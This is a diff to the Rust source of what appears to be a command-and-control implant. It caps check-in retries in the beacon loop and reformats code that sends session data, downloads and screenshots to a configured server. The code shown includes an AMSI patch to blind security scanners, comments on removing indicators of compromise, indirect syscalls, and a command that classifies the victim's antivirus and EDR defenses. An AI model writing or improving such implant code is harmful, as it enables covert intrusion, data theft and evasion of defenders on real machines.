@@ -79,15 +79,25 @@ pub unsafe fn beacon_loop() {
         auth_token: implant.auth_token, // per-implant one-time token (None for legacy)
     };
     let mut info_writer = Writer::new();
-    info.encode(&mut info_writer).expect("SessionInfo fields are bounded by config (hostname/user/os << MAX_BLOB_LEN)");
+    info.encode(&mut info_writer)
+        .expect("SessionInfo fields are bounded by config (hostname/user/os << MAX_BLOB_LEN)");
     let info_plain = info_writer.into_bytes();
 
     // Borrow the indirect-syscall runtime (initialized by entry). File ops fall
     // back to an explicit error if it isn't up — they cannot run without it.
     let rt = crate::syscalls::global();
 
-    // ---- check-in (retry) ----
+    // ---- check-in (retry, capped) ----
+    // M2: cap the check-in retries. If the server registers the session but the
+    // response is lost, the next retry carries counter=1 with a SessionInfo
+    // payload, but the server now sees an EXISTING session and tries to decode
+    // it as a TaskResponse → 400 → infinite retry loop. After MAX_CHECKIN_RETRIES
+    // failed attempts, give up on check-in and fall through to the task loop:
+    // the server has our session, and the next beacon cycle (counter+1, empty
+    // TaskResponse batch) will be handled as a normal existing-session beacon.
+    const MAX_CHECKIN_RETRIES: u32 = 5;
     let mut counter = 0u64;
+    let mut attempts = 0u32;
     loop {
         let frame = encode_frame(&pubkey, counter, &key, &info_plain);
         counter += 1;
@@ -98,6 +108,13 @@ pub unsafe fn beacon_loop() {
             cfg.use_tls,
         );
         if resp.is_some() {
+            break;
+        }
+        attempts += 1;
+        if attempts >= MAX_CHECKIN_RETRIES {
+            // Server may have registered us but the response was lost. Proceed
+            // to the task loop — the next beacon cycle will work (server treats
+            // us as an existing session).
             break;
         }
         sleep_jitter(
@@ -115,7 +132,9 @@ pub unsafe fn beacon_loop() {
         // when a scanner starts). After cycle 10 or on success, stop the PEB
         // walk to eliminate the per-cycle IOC.
         if !amsi_patched && cycle < 10 {
-            unsafe { crate::blind::maybe_patch_amsi(); }
+            unsafe {
+                crate::blind::maybe_patch_amsi();
+            }
             amsi_patched = crate::blind::amsi_patched();
         }
         let secs = SLEEP_SECS.load(core::sync::atomic::Ordering::Relaxed);
@@ -137,7 +156,12 @@ pub unsafe fn beacon_loop() {
             });
         }
 
-        let frame = encode_frame(&pubkey, counter, &key, &TaskResponse::encode_vec(&pending).expect("beacon batch encodes within MAX_BLOB_LEN"));
+        let frame = encode_frame(
+            &pubkey,
+            counter,
+            &key,
+            &TaskResponse::encode_vec(&pending).expect("beacon batch encodes within MAX_BLOB_LEN"),
+        );
         counter += 1;
         pending.clear();
 
@@ -174,8 +198,13 @@ pub unsafe fn beacon_loop() {
                 // If the accumulated batch would exceed the frame cap, flush it
                 // now (a streamed Download/Screenshot can produce a lot).
                 if pending_batch_size(&pending) > BATCH_FLUSH {
-                    let frame =
-                        encode_frame(&pubkey, counter, &key, &TaskResponse::encode_vec(&pending).expect("flush batch encodes within MAX_BLOB_LEN"));
+                    let frame = encode_frame(
+                        &pubkey,
+                        counter,
+                        &key,
+                        &TaskResponse::encode_vec(&pending)
+                            .expect("flush batch encodes within MAX_BLOB_LEN"),
+                    );
                     let _ = crate::transport::channel_post_frame(
                         cfg.server_host.as_bytes(),
                         cfg.server_port,
@@ -242,7 +271,8 @@ pub unsafe fn beacon_oneshot() -> u32 {
         auth_token: implant.auth_token,
     };
     let mut info_writer = Writer::new();
-    info.encode(&mut info_writer).expect("SessionInfo fields are bounded by config (hostname/user/os << MAX_BLOB_LEN)");
+    info.encode(&mut info_writer)
+        .expect("SessionInfo fields are bounded by config (hostname/user/os << MAX_BLOB_LEN)");
     let info_plain = info_writer.into_bytes();
     let rt = crate::syscalls::global();
 
@@ -275,7 +305,12 @@ pub unsafe fn beacon_oneshot() -> u32 {
     for _ in 0..6 {
         sleep_jitter(2, 0);
         // POST empty batch, receive any queued tasks.
-        let frame = encode_frame(&pubkey, counter, &key, &TaskResponse::encode_vec(&[]).expect("empty batch encodes trivially"));
+        let frame = encode_frame(
+            &pubkey,
+            counter,
+            &key,
+            &TaskResponse::encode_vec(&[]).expect("empty batch encodes trivially"),
+        );
         counter += 1;
         let Some(body) = crate::transport::channel_post_frame(
             cfg.server_host.as_bytes(),
@@ -313,7 +348,13 @@ pub unsafe fn beacon_oneshot() -> u32 {
             }
         }
         if !pending.is_empty() {
-            let rframe = encode_frame(&pubkey, counter, &key, &TaskResponse::encode_vec(&pending).expect("oneshot tail batch encodes within MAX_BLOB_LEN"));
+            let rframe = encode_frame(
+                &pubkey,
+                counter,
+                &key,
+                &TaskResponse::encode_vec(&pending)
+                    .expect("oneshot tail batch encodes within MAX_BLOB_LEN"),
+            );
             counter += 1;
             let _ = crate::transport::channel_post_frame(
                 cfg.server_host.as_bytes(),
@@ -390,15 +431,27 @@ fn execute(
         Command::Trex => {
             let assessment = unsafe { crate::trex::assess_user_mode() };
             let mut out: crate::heap::Vec<u8> = crate::heap::Vec::new();
-            let tier_names: &[&[u8]] = &[b"Clean", b"ConsumerAV", b"EnterpriseEDR", b"KernelArmed", b"Fortress"];
-            let tn = tier_names.get(assessment.tier as usize).map_or(&b"Unknown"[..], |s| *s);
+            let tier_names: &[&[u8]] = &[
+                b"Clean",
+                b"ConsumerAV",
+                b"EnterpriseEDR",
+                b"KernelArmed",
+                b"Fortress",
+            ];
+            let tn = tier_names
+                .get(assessment.tier as usize)
+                .map_or(&b"Unknown"[..], |s| *s);
             out.extend_from_slice(b"=== T-REX ===\nTier: ");
             out.extend_from_slice(tn);
             out.extend_from_slice(b"\nProducts: ");
             let n = assessment.products.len();
-            if n == 0 { out.extend_from_slice(b"none"); }
+            if n == 0 {
+                out.extend_from_slice(b"none");
+            }
             for (i, p) in assessment.products.iter().enumerate() {
-                if i > 0 { out.extend_from_slice(b", "); }
+                if i > 0 {
+                    out.extend_from_slice(b", ");
+                }
                 out.extend_from_slice(p.vendor.default_name().as_bytes());
             }
             out.extend_from_slice(b"\n");
